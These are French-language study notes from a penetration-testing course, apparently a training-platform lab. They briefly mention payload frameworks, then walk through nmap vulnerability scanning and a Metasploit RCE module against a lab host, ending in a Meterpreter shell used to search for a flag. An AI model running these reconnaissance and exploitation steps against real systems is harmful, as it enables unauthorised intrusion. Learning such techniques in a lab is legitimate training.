D'autres charges utiles critiques qui sont largement utilisées par les testeurs d'intrusion lors des évaluations de sécurité sont les charges utiles Empire et Cobalt Strike. Celles-ci ne sont pas dans le cadre de ce cours, mais n'hésitez pas à faire des recherches sur votre temps libre car elles peuvent fournir un aperçu significatif de la manière dont les testeurs d'intrusion professionnels effectuent leurs évaluations sur des cibles de grande valeur.

En plus de celles-ci, bien sûr, il existe une pléthore d'autres charges utiles. Certaines sont spécifiques à des fournisseurs d'équipements, tels que Cisco, Apple ou les automates programmables (PLC). Certaines que nous pouvons générer nous-mêmes en utilisant `msfvenom`. Cependant, nous allons ensuite nous pencher sur les `Encodeurs` et comment ils peuvent être utilisés pour influencer le résultat de l'attaque.

Lab de fin 

![[Pasted image 20260911234452.png]]

on commence par de la reconnaissance  classique nmap 

![[Pasted image 20260911234805.png]] 

on a notre cible ici  , sur le port 8081 maintenant on peut faire un scan plus intrusif sur le port cible  avec l'integration de script nse nmap 

nmap -sCV $ip -T5  -p 8081 --script vuln

![[Pasted image 20260912000218.png]]

le resultats du scan montre que on a une CVE de 2007 potentiellement exploitable sue la cible 

on va tester cela avec mfsconsole 

qunad on cherhe le nom de la CVE trouvé avec nmap on tombe sur sa 

![[Pasted image 20260912000840.png]]

qui est une vulnérabilité sert mais ne nous permet pas d'avoir du RCE sur le système cible  mais plutot de faire du Dos ce qu'on ne veaut pas . 

donc on va plutot chercher directement sur  msfconsole la RCE avec des mots clé comme : Druid par exemple 

![[Pasted image 20260912001331.png]]

les deux modules  encadrés nous suffisent emplement on peut commencé le test par le premier pour voir 

![[Pasted image 20260912001951.png]]

au 1 : set  lhost tun0 nous permet de specifier l'interface et en meme temps l'interface sur laquelle initier la connection avec l'hote 

au 2 : set rhost 10.129.203.52 nous permet de definir la cible pour ce type d'exploit 
au 3 : set srvport 8081 nous permet de définir le port cible à attaquer car le port du service cible  par défaut est le  8080  comme on le voit ici 
![[Pasted image 20260912002339.png]]

hors lors du scan nmap on voyait qu'il était lancer sur le port 8081 d'ou la mise à jour de l'information  

au 4 : check  nous permet de voir si l'hote ou les configurations faite sont compatibles avec l'exploit déliver  la section 5 à répondu a cette question en appruvant la vulnérabilité 

maintenant exploitons 

![[Pasted image 20260912002931.png]]

au 1 : on a la commande qui permet l'exploitation c'est elle qui déclenche le processus d'exploit 

au 2 : on a l'ensembe des sessions , des payloads et communications faites entre la cible et l'attaquant 

au 3 ; on un shell meterpretrer qui voudrait signifier que l'exploit a marcher sur le système cible  et on pourra avoir un shell système en tapant shell dans le meterpreter 

une fois bon l'exploration pour la trouvail du flag peut commencer  (une alternative serait de chercher avec find le flag )